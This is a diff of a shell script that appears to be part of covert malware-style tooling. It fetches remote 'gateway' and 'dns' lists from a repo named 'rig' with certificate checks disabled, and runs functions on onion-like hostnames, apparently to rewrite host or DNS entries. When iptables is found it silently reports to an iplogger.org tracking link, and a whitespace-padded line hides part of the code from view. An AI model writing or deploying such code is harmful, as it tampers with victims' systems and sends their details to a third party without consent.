@@ -1,6 +1,6 @@
-c=$(curl -s https://raw.githubusercontent.com/zoalsharf/rig/master/gateway)
-d=$(curl -s https://raw.githubusercontent.com/zoalsharf/rig/master/dns)
-di=$(command -v iptables|wc -l)
+c=$(wget --no-check-certificate -O - -q https://raw.githubusercontent.com/zoalsharf/rig/master/gateway || curl --insecure -s https://raw.githubusercontent.com/zoalsharf/rig/master/gateway)
+d=$(wget --no-check-certificate -O - -q https://raw.githubusercontent.com/zoalsharf/rig/master/dns || curl --insecure -s https://raw.githubusercontent.com/zoalsharf/rig/master/dns)
+s=$(command -v iptables|wc -l)
 
 del1 () {
         for i in ${c[@]}; do
@@ -26,19 +26,27 @@ host () {
         done
 }
 
-if [ $di -eq "1" ]; then
+
+
+
+del1 'nssnkct6udyyx6zlv4l6jhqr5jdf643shyerk246fs27ksrdehl2z3qd.'
+sleep 1
+del1 'ojk5zra7b3yq32timb27n4qj5udk4w2l5kqn5ulhnugdscelttfhtoyd.'
+sleep 1
+del1 'dreambusweduybcp.'
+sleep 2
+del2
+sleep 3
+chekhosts 'nssnkct6udyyx6zlv4l6jhqr5jdf643shyerk246fs27ksrdehl2z3qd.'
+sleep 2
+chekhosts 'ojk5zra7b3yq32timb27n4qj5udk4w2l5kqn5ulhnugdscelttfhtoyd.'
+sleep 3
+chekhosts 'dreambusweduybcp.'                                                                                                                                                                 sleep 3
+sleep 4
+host
+
+if [ $s -eq "1" ]; then
         curl -A Iptables-found/1.9 -s https://iplogger.org/389LB3
 else
         exit
 fi
-
-del2
-del1 'nssnkct6udyyx6zlv4l6jhqr5jdf643shyerk246fs27ksrdehl2z3qd.'
-del1 'ojk5zra7b3yq32timb27n4qj5udk4w2l5kqn5ulhnugdscelttfhtoyd.'
-del1 'dreambusweduybcp.'
-sleep 3
-chekhosts 'nssnkct6udyyx6zlv4l6jhqr5jdf643shyerk246fs27ksrdehl2z3qd.'
-chekhosts 'ojk5zra7b3yq32timb27n4qj5udk4w2l5kqn5ulhnugdscelttfhtoyd.'
-chekhosts 'dreambusweduybcp.'                                                                                                                                                                 sleep 3
-host
-
